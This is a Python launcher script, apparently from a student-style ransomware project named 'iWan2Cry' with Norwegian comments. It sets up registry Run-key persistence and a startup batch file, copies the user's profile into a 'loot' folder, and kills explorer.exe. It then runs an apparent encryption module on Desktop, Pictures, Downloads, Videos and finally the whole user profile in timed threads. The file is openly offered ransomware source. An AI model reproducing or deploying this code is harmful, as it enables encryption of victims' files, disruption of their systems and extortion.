import main_v2
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util import Counter
import argparse
import sys
import base64
import platform 
import getpass
import socket
import base64
import zipfile
import discover
import modify
from gui import mainwindow
import time
import os
import subprocess
import threading
import winreg
import shutil

def get_user():
    HEI = subprocess.check_output("whoami", shell=True)
    HEI = HEI.decode("UTF-8").strip()
    username = HEI.split("\\")[-1]
    return username

target_user = get_user()
script_path = os.path.abspath("START.py")
script_folder = os.path.dirname(os.path.abspath(__file__))
DATA_VALUE = script_folder + "\\startup.bat"
root_path = r"C:\\"
destination_path = r"C:\\Users\\" + target_user + r"\\Desktop"
folder_name = "loot"
# Sett opp parameterne for hver kjoring
param_set_1 = f"-p C:\\Users\\{target_user}\\Desktop\\loot -e"
param_set_2 = f"-p C:\\Users\\{target_user}\\Pictures -e"
param_set_3 = f"-p C:\\Users\\{target_user}\\Downloads -e"
param_set_4 = f"-p C:\\Users\\{target_user}\\Videos -e"
param_set_death = f"-p C:\\Users\\{target_user} -e"
## FLERE PARAMETERE VED BEHOV
parameters = f"{param_set_1} {param_set_2} {param_set_3} {param_set_4} {param_set_death}"

def make_bat():
    os.system(f"echo @echo off > C:\\Users\\{target_user}\\Desktop\\iWan2Cry\\iWan2Cry\\startup.bat")
    os.system(f"echo start /B pyw \"C:\\Users\\{target_user}\\Desktop\\iWan2Cry\\iWan2Cry\\START.py\" >> C:\\Users\\{target_user}\\Desktop\\iWan2Cry\\iWan2Cry\\startup.bat")

def copy_user_folders(root_path, destination_path, target_user, folder_name):
    try: 
        if not os.path.exists(destination_path + "loot"):
            for foldername, subfolders, filenames in os.walk(root_path):
                #sjekker om det er undermappe under maalmappe
                if target_user.lower() in [subfolder.lower() for subfolder in subfolders]:
                    source_user_folder = os.path.join(foldername, target_user)
                    destination_user_folder = os.path.join(destination_path, folder_name)
                
                    #kopiere hele mappen inkludert undermappe og filer
                    shutil.copytree(source_user_folder, destination_user_folder)
                    print("Kopiert brukermappen til: {destination_user_folder}")
        else:
            print(f"Loot-map already exists")
    except Exception as e:
        print(f"Feil ved kopiering av brukermapper {e}")
        

def add_to_registry(script_path, parameters):
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    key_name = "SandOrmerVarHer"
    
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, DATA_VALUE)
    except Exception as e:
        print(f"NOE FEIL SKJER: {e}")

##TESTING
def run_script(parameters):
    main_script_path = os.path.join(script_folder , 'main_v2.py')
    
    command = f"py {main_script_path} {parameters}"
    subprocess.run(command, shell=True)
    
def run_script_with_delay(parameters, delay):
    run_script(parameters)
    time.sleep(delay)
    
   
def run_this_bitch():
    
    # thread for param 1 
    thread_1 = threading.Thread(target=run_script_with_delay, args=(param_set_1, 10))

    # thread for param 2
    thread_2 = threading.Thread(target=run_script_with_delay, args=(param_set_2, 10))
    thread_3 = threading.Thread(target=run_script_with_delay, args=(param_set_3, 10))
    thread_4 = threading.Thread(target=run_script_with_delay, args=(param_set_4, 10))
    thread_5 = threading.Thread(target=run_script_with_delay, args=(param_set_death, 10))

    # Starte traader
    thread_1.start()
    time.sleep(1500)
    thread_2.start()
    time.sleep(1500)
    thread_3.start()
    time.sleep(1500)
    thread_4.start()
    time.sleep(900)
    thread_5.start()

    # Vente paa traader
    thread_1.join()
    thread_2.join()
    thread_3.join()
    thread_4.join()
    thread_5.join()

def moro():
    os.system("taskkill /f /im explorer.exe")

def main():
    moro()
    run_this_bitch()
    
    
if __name__ == "__main__":
    main()

